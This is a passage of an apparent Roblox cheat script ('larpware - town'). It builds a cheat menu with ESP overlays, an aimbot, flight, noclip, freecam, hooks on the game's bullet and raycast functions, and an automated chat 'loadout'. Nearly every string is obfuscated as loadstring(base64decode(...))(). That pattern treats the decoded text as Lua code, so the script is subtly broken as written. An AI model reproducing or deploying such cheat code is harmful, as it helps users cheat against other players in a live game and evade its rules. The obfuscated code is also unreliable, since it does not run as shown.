        local padding = Instance.new(loadstring(base64decode("VUlQYWRkaW5n"))())
        padding.PaddingLeft = UDim.new(0, 8)
        padding.PaddingRight = UDim.new(0, 8)
        padding.Parent = label
        local stroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
        stroke.Color = Color3.fromRGB(0, 85, 255)
        stroke.Thickness = 1
        stroke.Parent = label
        label.Parent = frame

        table.insert(lines, label)
        while #lines > KILL_LOG_MAX do
            local oldest = table.remove(lines, 1)
            if oldest then oldest:Destroy() end
        end
        task.delay(KILL_LOG_TIME, function()
            local index = table.find(lines, label)
            if index then table.remove(lines, index) end
            fadeOut(label)
        end)
    end

    local function colored(name, isMe, meColor)
        if isMe then return string.format('<font color=loadstring(base64decode("JXM="))()>%s</font>', meColor, name) end
        return name
    end

    local guesses = setmetatable({}, { __mode = loadstring(base64decode("aw=="))() })

    local function guessAttacker(player, character)
        local root = character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        local best, bestDistance = nil, GUESS_RANGE
        for _, other in ipairs(Players:GetPlayers()) do
            local otherCharacter = other.Character
            local otherRoot = otherCharacter and otherCharacter:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if other ~= player and otherRoot and otherCharacter:FindFirstChildOfClass(loadstring(base64decode("VG9vbA=="))()) then
                local distance = (otherRoot.Position - root.Position).Magnitude
                if distance < bestDistance then best, bestDistance = other, distance end
            end
        end
        return best
    end

    local function logKill(player, character, humanoid)
        if not killLog.alive or not character or logged[character] then return end
        logged[character] = true
        if not options.killlog then return end

        local killer, guessed
        local tag = humanoid and humanoid:FindFirstChild(loadstring(base64decode("Y3JlYXRvcg=="))())
        if tag and tag:IsA(loadstring(base64decode("T2JqZWN0VmFsdWU="))()) then killer = tag.Value end
        local cached = humanoid and killers[humanoid]
        if not killer and cached and os.clock() - cached.at < KILLER_MAX_AGE then killer = cached.value end
        local guess = humanoid and guesses[humanoid]
        if not killer and guess and os.clock() - guess.at < KILLER_MAX_AGE then killer, guessed = guess.value, true end

        local victimName = player.Name
        local victimIsMe = player == LocalPlayer
        if typeof(killer) == loadstring(base64decode("SW5zdGFuY2U="))() and killer ~= player then
            local killerIsMe = killer == LocalPlayer
            pushLine(string.format(loadstring(base64decode("JXMga2lsbGVkICVzJXM="))(),
                colored(killer.Name, killerIsMe, ME_COLOR), colored(victimName, victimIsMe, DEAD_COLOR),
                guessed and loadstring(base64decode("ICg/KQ=="))() or loadstring(base64decode(""))()))
        else
            pushLine(string.format(loadstring(base64decode("JXMgZGllZA=="))(), colored(victimName, victimIsMe, DEAD_COLOR)))
        end
    end

    local function watchCharacter(player, character)
        task.spawn(function()
            local humanoid = character:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))(), 10)
            if not humanoid or not killLog.alive then return end

            local function remember(tag)
                if tag.Name ~= loadstring(base64decode("Y3JlYXRvcg=="))() or not tag:IsA(loadstring(base64decode("T2JqZWN0VmFsdWU="))()) then return end
                local function save()
                    if tag.Value then killers[humanoid] = { value = tag.Value, at = os.clock() } end
                end
                save()
                tag:GetPropertyChangedSignal(loadstring(base64decode("VmFsdWU="))()):Connect(save)
            end
            for _, child in ipairs(humanoid:GetChildren()) do remember(child) end
            humanoid.ChildAdded:Connect(remember)

            local lastHealth = humanoid.Health
            humanoid.HealthChanged:Connect(function(health)
                if health < lastHealth and health > DOWN_HEALTH then

                    local attacker = guessAttacker(player, character)
                    if attacker then guesses[humanoid] = { value = attacker, at = os.clock() } end
                end
                if health <= DOWN_HEALTH then
                    if lastHealth > DOWN_HEALTH or not logged[character] then
                        local attacker = guessAttacker(player, character)
                        if attacker then guesses[humanoid] = { value = attacker, at = os.clock() } end
                        logKill(player, character, humanoid)
                    end
                else
                    logged[character] = nil
                end
                lastHealth = health
            end)
            character.ChildAdded:Connect(function(child)
                if child.Name == loadstring(base64decode("RG93bmVk"))() then logKill(player, character, humanoid) end
            end)
            character.ChildRemoved:Connect(function(child)
                if child.Name == loadstring(base64decode("RG93bmVk"))() and humanoid.Health > DOWN_HEALTH then logged[character] = nil end
            end)
            humanoid.Died:Connect(function() logKill(player, character, humanoid) end)

            if humanoid.Health <= DOWN_HEALTH and humanoid.Health > 0 and character:FindFirstChild(loadstring(base64decode("RG93bmVk"))()) then
                logKill(player, character, humanoid)
            end
        end)
    end

    local function watchPlayer(player)
        if player.Character then watchCharacter(player, player.Character) end
        table.insert(connections, player.CharacterAdded:Connect(function(character)
            watchCharacter(player, character)
        end))
    end
    for _, player in ipairs(Players:GetPlayers()) do watchPlayer(player) end
    table.insert(connections, Players.PlayerAdded:Connect(watchPlayer))

    local bloodEvent = ReplicatedStorage:FindFirstChild(loadstring(base64decode("Qmxvb2RFdmVudA=="))())
    if bloodEvent then
        table.insert(connections, bloodEvent.OnClientEvent:Connect(function(character, kind)
            if kind ~= loadstring(base64decode("Y29ycHNl"))() or typeof(character) ~= loadstring(base64decode("SW5zdGFuY2U="))() then return end
            local player = Players:GetPlayerFromCharacter(character)
            if player then logKill(player, character, character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())) end
        end))
    end

    function killLog.clear()
        for _, label in ipairs(lines) do label:Destroy() end
        lines = {}
    end
end

local THEME = {
    back = Color3.fromRGB(28, 28, 28),
    main = Color3.fromRGB(20, 20, 20),
    accent = Color3.fromRGB(0, 85, 255),
    outline = Color3.fromRGB(50, 50, 50),
    text = Color3.new(1, 1, 1),
    dim = Color3.fromRGB(150, 150, 150),
}
local UI_FONT = Enum.Font.Code

local function make(class, props, parent)
    local object = Instance.new(class)
    for key, value in pairs(props) do object[key] = value end
    object.Parent = parent
    return object
end

local menu = make(loadstring(base64decode("U2NyZWVuR3Vp"))(), { Name = loadstring(base64decode("TGFycHdhcmVNZW51"))(), ResetOnSpawn = false, DisplayOrder = 2 }, parentGui)

local window = make(loadstring(base64decode("RnJhbWU="))(), {
    Size = UDim2.fromOffset(560, 430),
    Position = UDim2.fromOffset(60, 60),
    BackgroundColor3 = THEME.back,
    BorderColor3 = Color3.new(0, 0, 0),
    BorderSizePixel = 1,
    Active = true,
}, menu)
make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = THEME.accent, BorderSizePixel = 0 }, window)

local titleBar = make(loadstring(base64decode("VGV4dExhYmVs"))(), {
    Size = UDim2.new(1, 0, 0, 24), Position = UDim2.fromOffset(0, 2),
    BackgroundTransparency = 1, Font = UI_FONT, Text = loadstring(base64decode("ICBsYXJwd2FyZSAtIHRvd24="))(), TextSize = 15,
    TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
}, window)

local tabBar = make(loadstring(base64decode("RnJhbWU="))(), {
    Position = UDim2.fromOffset(8, 28), Size = UDim2.new(1, -16, 0, 22), BackgroundTransparency = 1,
}, window)
make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), {
    FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder,
}, tabBar)

local pages = make(loadstring(base64decode("RnJhbWU="))(), {
    Position = UDim2.fromOffset(8, 50), Size = UDim2.new(1, -16, 1, -76),
    BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
}, window)

local statusLabel = make(loadstring(base64decode("VGV4dExhYmVs"))(), {
    Position = UDim2.new(0, 10, 1, -20), Size = UDim2.new(1, -20, 0, 16), BackgroundTransparency = 1,
    Font = UI_FONT, TextSize = 12, TextColor3 = THEME.dim, TextXAlignment = Enum.TextXAlignment.Left, Text = loadstring(base64decode(""))(),
}, window)
local notifyToken = 0
local function notify(text)
    notifyToken += 1
    local mine = notifyToken
    statusLabel.Text = text
    task.delay(2.5, function()
        if notifyToken == mine then statusLabel.Text = loadstring(base64decode(""))() end
    end)
end

local activeSlider
table.insert(connections, UserInputService.InputChanged:Connect(function(input)
    if activeSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        activeSlider(input.Position.X)
    end
end))
table.insert(connections, UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        activeSlider = nil
    end
end))

local bindCapture, lastBindInput
table.insert(connections, UserInputService.InputBegan:Connect(function(input)
    if bindCapture and input.UserInputType == Enum.UserInputType.Keyboard then
        local finish = bindCapture
        bindCapture, lastBindInput = nil, input
        finish(input.KeyCode)
    end
end))

local function makeGroup(column, title)
    local box = make(loadstring(base64decode("RnJhbWU="))(), {
        Size = UDim2.new(1, -6, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundColor3 = THEME.main, BorderColor3 = THEME.outline, BorderSizePixel = 1,
    }, column)
    make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = THEME.accent, BorderSizePixel = 0 }, box)
    local body = make(loadstring(base64decode("RnJhbWU="))(), {
        Position = UDim2.fromOffset(0, 2), Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
    }, box)
    make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, body)
    make(loadstring(base64decode("VUlQYWRkaW5n"))(), { PaddingTop = UDim.new(0, 4), PaddingBottom = UDim.new(0, 6), PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 6) }, body)
    make(loadstring(base64decode("VGV4dExhYmVs"))(), {
        Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Font = UI_FONT, Text = title, TextSize = 14,
        TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
    }, body)

    local group = {}

    function group.Toggle(text, key, onChange)
        local row = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = loadstring(base64decode(""))(), AutoButtonColor = false }, body)
        local check = make(loadstring(base64decode("RnJhbWU="))(), {
            Size = UDim2.fromOffset(12, 12), Position = UDim2.fromOffset(0, 2),
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
        }, row)
        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Position = UDim2.fromOffset(20, 0), Size = UDim2.new(1, -20, 1, 0), BackgroundTransparency = 1,
            Font = UI_FONT, Text = text, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
        }, row)
        local function refresh()
            check.BackgroundColor3 = options[key] and THEME.accent or THEME.back
        end
        row.MouseButton1Click:Connect(function()
            options[key] = not options[key]
            if onChange then onChange(options[key]) end
            refresh()
        end)
        refresh()
        return refresh
    end

    function group.Slider(text, min, max, get, set, suffix)
        local row = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1 }, body)
        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Font = UI_FONT, Text = text, TextSize = 14,
            TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
        }, row)
        local value = make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Font = UI_FONT, Text = loadstring(base64decode(""))(), TextSize = 14,
            TextColor3 = THEME.dim, TextXAlignment = Enum.TextXAlignment.Right,
        }, row)
        local track = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
            Position = UDim2.fromOffset(0, 17), Size = UDim2.new(1, 0, 0, 10), Text = loadstring(base64decode(""))(), AutoButtonColor = false,
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
        }, row)
        local fill = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(0, 0, 1, 0), BackgroundColor3 = THEME.accent, BorderSizePixel = 0 }, track)
        local function refresh()
            local current = get()
            fill.Size = UDim2.new(math.clamp((current - min) / (max - min), 0, 1), 0, 1, 0)
            value.Text = tostring(current) .. (suffix or loadstring(base64decode(""))())
        end
        local function fromX(x)
            local fraction = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
            set(math.floor(min + fraction * (max - min) + 0.5))
            refresh()
        end
        track.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                activeSlider = fromX
                fromX(input.Position.X)
            end
        end)
        refresh()
    end

    function group.Cycle(text, values, get, set)
        local row = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 38), BackgroundTransparency = 1 }, body)
        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Font = UI_FONT, Text = text, TextSize = 14,
            TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
        }, row)
        local box = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
            Position = UDim2.fromOffset(0, 16), Size = UDim2.new(1, 0, 0, 20), AutoButtonColor = false, Text = loadstring(base64decode(""))(),
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
        }, row)
        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Size = UDim2.new(1, -6, 1, 0), BackgroundTransparency = 1, Font = UI_FONT, Text = loadstring(base64decode("dg=="))(), TextSize = 12,
            TextColor3 = THEME.dim, TextXAlignment = Enum.TextXAlignment.Right,
        }, box)
        local function refresh() box.Text = loadstring(base64decode("ICA="))() .. tostring(values[get()]) end
        box.MouseButton1Click:Connect(function() set(get() % #values + 1); refresh() end)
        box.MouseButton2Click:Connect(function() set((get() - 2) % #values + 1); refresh() end)
        refresh()
    end

    function group.Button(text, onClick)
        local button = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
            Size = UDim2.new(1, 0, 0, 20), AutoButtonColor = false, Text = text,
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text,
        }, body)
        button.MouseButton1Click:Connect(onClick)
        return button
    end

    function group.Keybind(text, get, set)
        local row = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 20), BackgroundTransparency = 1 }, body)
        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Size = UDim2.new(1, -70, 1, 0), BackgroundTransparency = 1, Font = UI_FONT, Text = text, TextSize = 14,
            TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
        }, row)
        local box = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
            Position = UDim2.new(1, -64, 0, 0), Size = UDim2.fromOffset(64, 20), AutoButtonColor = false, Text = loadstring(base64decode(""))(),
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
            Font = UI_FONT, TextSize = 13, TextColor3 = THEME.text,
        }, row)
        local function refresh()
            local key = get()
            box.Text = key and key.Name or loadstring(base64decode("Tm9uZQ=="))()
        end
        box.MouseButton1Click:Connect(function()
            box.Text = loadstring(base64decode("Li4u"))()
            bindCapture = function(key)
                set(key ~= Enum.KeyCode.Escape and key or nil)
                refresh()
            end
        end)
        refresh()
    end

    function group.Input(placeholder, onEnter)
        local input = make(loadstring(base64decode("VGV4dEJveA=="))(), {
            Size = UDim2.new(1, 0, 0, 20), Text = loadstring(base64decode(""))(), PlaceholderText = placeholder, ClearTextOnFocus = false,
            PlaceholderColor3 = Color3.fromRGB(120, 120, 120),
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
        }, body)
        input.FocusLost:Connect(function(enterPressed)
            if enterPressed then
                onEnter(input.Text)
                input.Text = loadstring(base64decode(""))()
            end
        end)
        return input
    end

    function group.TextArea(placeholder, initial, onChange, onCommit)
        local box = make(loadstring(base64decode("VGV4dEJveA=="))(), {
            Size = UDim2.new(1, 0, 0, 110), Text = initial or loadstring(base64decode(""))(), PlaceholderText = placeholder,
            ClearTextOnFocus = false, MultiLine = true, TextWrapped = true,
            PlaceholderColor3 = Color3.fromRGB(120, 120, 120),
            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text,
            TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
        }, body)
        box:GetPropertyChangedSignal(loadstring(base64decode("VGV4dA=="))()):Connect(function()
            if onChange then onChange(box.Text) end
        end)
        box.FocusLost:Connect(function()
            if onCommit then onCommit(box.Text) end
        end)
        return box
    end

    function group.Label(text)
        return make(loadstring(base64decode("VGV4dExhYmVs"))(), {
            Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1,
            Font = UI_FONT, Text = text, TextSize = 12, TextColor3 = THEME.dim, RichText = true, TextWrapped = true,
            TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
        }, body)
    end

    function group.Container()
        local container = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1 }, body)
        make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder }, container)
        return container
    end

    return group
end

local tabs = {}
local function selectTab(tab)
    for _, other in ipairs(tabs) do
        local selected = other == tab
        other.page.Visible = selected
        other.button.BackgroundColor3 = selected and THEME.back or THEME.main
        other.button.TextColor3 = selected and THEME.text or THEME.dim
        other.accent.Visible = selected
    end
end

local function addTab(name)
    local tab = {}
    tab.button = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
        Size = UDim2.fromOffset(#name * 8 + 24, 22), AutoButtonColor = false, Text = name, LayoutOrder = #tabs + 1,
        BackgroundColor3 = THEME.main, BorderColor3 = THEME.outline, BorderSizePixel = 1,
        Font = UI_FONT, TextSize = 14, TextColor3 = THEME.dim,
    }, tabBar)
    tab.accent = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = THEME.accent, BorderSizePixel = 0, Visible = false }, tab.button)
    tab.page = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Visible = false }, pages)

    local function column(x, offset)
        local scroller = make(loadstring(base64decode("U2Nyb2xsaW5nRnJhbWU="))(), {
            Position = UDim2.new(x, offset, 0, 6), Size = UDim2.new(0.5, -9, 1, -12), BackgroundTransparency = 1,
            BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = THEME.accent,
            CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, ScrollingDirection = Enum.ScrollingDirection.Y,
        }, tab.page)
        make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, scroller)
        return scroller
    end
    local left, right = column(0, 6), column(0.5, 3)

    function tab.group(side, title)
        return makeGroup(side == loadstring(base64decode("bGVmdA=="))() and left or right, title)
    end

    tab.button.MouseButton1Click:Connect(function() selectTab(tab) end)
    table.insert(tabs, tab)
    return tab
end

local loadout = { token = 0, text = loadstring(base64decode(""))(), delayMs = 2500, running = false }
do
    local LOADOUT_FILE = loadstring(base64decode("TGFycHdhcmVMb2Fkb3V0LnR4dA=="))()
    local TextChatService = game:GetService(loadstring(base64decode("VGV4dENoYXRTZXJ2aWNl"))())

    if type(isfile) == loadstring(base64decode("ZnVuY3Rpb24="))() and type(readfile) == loadstring(base64decode("ZnVuY3Rpb24="))() then
        local ok, text = pcall(function()
            return isfile(LOADOUT_FILE) and readfile(LOADOUT_FILE) or loadstring(base64decode(""))()
        end)
        if ok then loadout.text = text end
    end

    function loadout.save()
        if type(writefile) == loadstring(base64decode("ZnVuY3Rpb24="))() then pcall(writefile, LOADOUT_FILE, loadout.text) end
    end

    local function sendChat(message)
        task.spawn(function()
            local ok = pcall(function()
                local channel = TextChatService:FindFirstChild(loadstring(base64decode("VGV4dENoYW5uZWxz"))())
                    and TextChatService.TextChannels:FindFirstChild(loadstring(base64decode("UkJYR2VuZXJhbA=="))())
                assert(channel, loadstring(base64decode("bm8gUkJYR2VuZXJhbCBjaGFubmVs"))())
                channel:SendAsync(message)
            end)
            if ok then return end

            local events = ReplicatedStorage:FindFirstChild(loadstring(base64decode("RGVmYXVsdENoYXRTeXN0ZW1DaGF0RXZlbnRz"))())
            local say = events and events:FindFirstChild(loadstring(base64decode("U2F5TWVzc2FnZVJlcXVlc3Q="))())
            if say then say:FireServer(message, loadstring(base64decode("QWxs"))()) end
        end)
        return true
    end

    function loadout.stop()
        loadout.token += 1
        loadout.running = false
    end

    local serverMessage = ReplicatedStorage:FindFirstChild(loadstring(base64decode("U2VydmVyRGlzcGxheU1lc3NhZ2U="))())
    if serverMessage then
        table.insert(connections, serverMessage.OnClientEvent:Connect(function(message)
            if not loadout.running then return end
            local text = tostring(message):gsub(loadstring(base64decode("PFtePl0rPg=="))(), loadstring(base64decode(""))())
            print(loadstring(base64decode("W2xhcnB3YXJlXSBnYW1lIHNheXM6IA=="))() .. text)
            notify(loadstring(base64decode("R2FtZTog"))() .. string.sub(text, 1, 70))
        end))
    end

    function loadout.run(auto)

        if auto and loadout.running then return end
        loadout.token += 1
        local mine = loadout.token

        local commands = {}
        local normalized = (loadout.text:gsub(loadstring(base64decode("KCVTKSVzKyghKQ=="))(), loadstring(base64decode("JTFcbiUy"))()))
        for line in string.gmatch(normalized, loadstring(base64decode("W15cclxuXSs="))()) do
            local trimmed = line:match(loadstring(base64decode("XiVzKiguLSklcyok"))())
            if trimmed ~= loadstring(base64decode(""))() then table.insert(commands, trimmed) end
        end
        if #commands == 0 then
            notify(loadstring(base64decode("TG9hZG91dCBpcyBlbXB0eQ=="))())
            return
        end

        loadout.running = true
        task.spawn(function()
            for index, command in ipairs(commands) do
                if loadout.token ~= mine then return end
                notify(string.format(loadstring(base64decode("TG9hZG91dCAlZC8lZDogJXM="))(), index, #commands, command))
                print(string.format(loadstring(base64decode("W2xhcnB3YXJlXSBsb2Fkb3V0ICVkLyVkOiAlcw=="))(), index, #commands, command))
                sendChat(command)

                local waitUntil = os.clock() + loadout.delayMs / 1000
                while os.clock() < waitUntil do
                    if loadout.token ~= mine then return end
                    task.wait(0.1)
                end
            end
            if loadout.token == mine then
                loadout.running = false
                notify(loadstring(base64decode("TG9hZG91dCBkb25l"))())
            end
        end)
    end

    table.insert(connections, LocalPlayer.CharacterAdded:Connect(function()
        if not options.loadoutspawn then return end
        task.wait(1.5)
        if options.loadoutspawn and LocalPlayer.Character then loadout.run(true) end
    end))
end

local fly = { speed = 60, key = Enum.KeyCode.G, was = false }
local refreshFly

local function setFly(on)
    options.fly = on
    if not on then
        local character = LocalPlayer.Character
        local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if root and fly.was then root.AssemblyLinearVelocity = Vector3.zero end
        fly.was = false
    end
    if refreshFly then refreshFly() end
end

table.insert(connections, RunService.Heartbeat:Connect(function()
    if not options.fly then return end
    local character = LocalPlayer.Character
    local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
    local camera = Workspace.CurrentCamera
    if not root or not camera then return end
    fly.was = true
    if options.freecam then root.AssemblyLinearVelocity = Vector3.zero return end

    local move = Vector3.zero
    if not UserInputService:GetFocusedTextBox() then
        local function down(key) return UserInputService:IsKeyDown(key) and 1 or 0 end
        local look, right = camera.CFrame.LookVector, camera.CFrame.RightVector
        move = look * (down(Enum.KeyCode.W) - down(Enum.KeyCode.S))
            + right * (down(Enum.KeyCode.D) - down(Enum.KeyCode.A))
            + Vector3.yAxis * (down(Enum.KeyCode.Space) - down(Enum.KeyCode.LeftControl))
    end
    root.AssemblyLinearVelocity = move.Magnitude > 0 and move.Unit * fly.speed or Vector3.zero
end))

table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
    if processed or input == lastBindInput or bindCapture then return end
    if fly.key and input.KeyCode == fly.key then
        setFly(not options.fly)
        notify(options.fly and loadstring(base64decode("RmxpZ2h0IG9u"))() or loadstring(base64decode("RmxpZ2h0IG9mZg=="))())
    end
end))

local function cleanup()
    killLog.alive = false
    loadout.stop()
    if options.day and savedClock then Lighting.ClockTime = savedClock end
    options.nodark = false
    options.nofog = false
    options.wallclick = false
    options.noclip = false
    options.freecam = false
    setFly(false)
    options.aimbot = false
    options.spy = false
    aim.running = false
    cancelLock()
    gun.alive = false
    if gun.env then
        if gun.rayWrap and gun.env.RayCast2 == gun.rayWrap then pcall(rawset, gun.env, loadstring(base64decode("UmF5Q2FzdDI="))(), gun.rayOrig) end
        if gun.fireWrap and gun.env.fireBullet == gun.fireWrap then pcall(rawset, gun.env, loadstring(base64decode("ZmlyZUJ1bGxldA=="))(), gun.fireOrig) end
    end
    setFreecam(false)
    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcEZyZWVjYW0="))()) end)
    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcEFpbQ=="))()) end)
    resetNoclip()
    restoreWallParts(nil)
    wallHighlight:Destroy()
    restoreNoDark()
    restoreNoFog()
    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcE5vRGFyaw=="))()) end)
    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcE5vRm9n"))()) end)
    for _, connection in ipairs(connections) do connection:Disconnect() end
    for player in pairs(entries) do unhook(player) end
    overlay:Destroy()
    menu:Destroy()
    env.__TownEspCleanup = nil
end
env.__TownEspCleanup = cleanup

local espTab = addTab(loadstring(base64decode("RVNQ"))())
do
    local g = espTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("RVNQ"))())
    g.Toggle(loadstring(base64decode("RW5hYmxlZA=="))(), loadstring(base64decode("ZXNw"))())
    g.Toggle(loadstring(base64decode("Qm94"))(), loadstring(base64decode("Ym94"))())
    g.Toggle(loadstring(base64decode("U2tlbGV0b24="))(), loadstring(base64decode("c2tlbGV0b24="))())
    g.Toggle(loadstring(base64decode("TmFtZXM="))(), loadstring(base64decode("bmFtZXM="))())
    g.Toggle(loadstring(base64decode("VHJhY2Vycw=="))(), loadstring(base64decode("dHJhY2Vycw=="))())
    g.Toggle(loadstring(base64decode("SGVhbHRoIEJhcg=="))(), loadstring(base64decode("aGVhbHRo"))())
    g.Toggle(loadstring(base64decode("VmlzaWJsZSBDb2xvdXI="))(), loadstring(base64decode("dmlzY29sb3I="))())
    g.Toggle(loadstring(base64decode("U0FGRSAvIFVOU0FGRQ=="))(), loadstring(base64decode("c2FmZQ=="))())

    local w = espTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("V2F0Y2hsaXN0"))())
    w.Toggle(loadstring(base64decode("SGlnaGxpZ2h0IFdhdGNoZWQ="))(), loadstring(base64decode("d2F0Y2hsaXN0"))())
    local watchList
    local watchRows = {}
    local function refreshWatchUI()
        for _, row in ipairs(watchRows) do row:Destroy() end
        watchRows = {}
        local names = {}
        for name in pairs(watchlist) do table.insert(names, name) end
        table.sort(names)
        for _, name in ipairs(names) do
            local row = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
                Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, AutoButtonColor = false, Text = loadstring(base64decode("Wy1dIA=="))() .. name,
                Font = UI_FONT, TextSize = 14, TextColor3 = Color3.fromRGB(255, 90, 90), TextXAlignment = Enum.TextXAlignment.Left,
            }, watchList)
            row.MouseButton1Click:Connect(function()
                watchlist[name] = nil
                saveWatchlist()
                refreshWatchUI()
            end)
            watchRows[#watchRows + 1] = row
        end
    end
    w.Input(loadstring(base64decode("dXNlcm5hbWUgKyBFbnRlcg=="))(), function(text)
        addWatch(text)
        refreshWatchUI()
    end)
    watchList = w.Container()
    refreshWatchUI()
end

local aimTab = addTab(loadstring(base64decode("QWltYm90"))())
do
    local g = aimTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("QWltYm90"))())
    g.Toggle(loadstring(base64decode("RW5hYmxlZA=="))(), loadstring(base64decode("YWltYm90"))(), function(on)
        if not on then
            aim.running = false
            cancelLock()
        end
    end)
    g.Toggle(loadstring(base64decode("VG9nZ2xlIE1vZGU="))(), loadstring(base64decode("YWltdG9nZ2xl"))(), function()
        aim.running = false
        cancelLock()
    end)
    g.Cycle(loadstring(base64decode("TG9jayBQYXJ0"))(), AIM_PARTS, function() return aimPartIndex end, function(JfZaEVmK) aimPartIndex = JfZaEVmK; cancelLock() end)
    g.Cycle(loadstring(base64decode("TG9jayBNb2Rl"))(), AIM_LOCKS, function() return aimLockIndex end, function(JfZaEVmK) aimLockIndex = JfZaEVmK; cancelLock() end)
    g.Slider(loadstring(base64decode("Rk9W"))(), 30, 600, function() return aimFov end, function(v) aimFov = v end)
